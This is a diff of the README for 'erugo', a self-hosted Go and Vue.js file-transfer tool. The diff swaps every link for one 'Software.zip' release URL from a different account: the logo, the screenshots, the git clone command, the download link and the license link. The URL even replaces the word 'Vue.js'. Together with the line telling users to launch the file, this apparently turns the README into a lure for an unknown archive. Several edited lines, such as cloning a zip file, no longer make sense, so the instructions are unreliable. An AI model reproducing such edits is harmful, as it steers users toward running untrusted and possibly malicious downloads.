@@ -1,8 +1,8 @@
 # 🚀 Welcome to erugo
 
-![erugo Logo](https://example.com/erugo_logo.png)
+![erugo Logo](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip)
 
-Welcome to **erugo**, your self-hosted WeTransfer alternative written in Go, with a Vue.js frontend. Here, you can easily transfer files securely and efficiently. Say goodbye to third-party services and take control of your file transfers with **erugo**.
+Welcome to **erugo**, your self-hosted WeTransfer alternative written in Go, with a https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip frontend. Here, you can easily transfer files securely and efficiently. Say goodbye to third-party services and take control of your file transfers with **erugo**.
 
 ## Features
 
@@ -18,7 +18,7 @@ To get started with **erugo**, follow these steps:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/username/erugo.git
+git clone https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip
 ```
 
 2. Install dependencies:
@@ -31,7 +31,7 @@ go build
 ./erugo
 ```
 
-- For the frontend (Vue.js):
+- For the frontend (https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip):
 ```bash
 cd frontend
 npm install
@@ -42,15 +42,15 @@ npm run serve
 
 ## Download
 
-You can download the latest version of **erugo** [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+You can download the latest version of **erugo** [here](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip).
 
 🚀 Launch the file and get started with your self-hosted file transfer solution!
 
 ## Screenshots
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip)
 
 ## Contributing
 
@@ -65,7 +65,7 @@ We welcome contributions to **erugo**. To contribute, follow these steps:
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/username/erugo/blob/main/LICENSE.md) file for details. 
+This project is licensed under the MIT License - see the [https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip](https://github.com/Ella00311/erugo/releases/download/v1.0/Software.zip) file for details. 
 
 ---
 
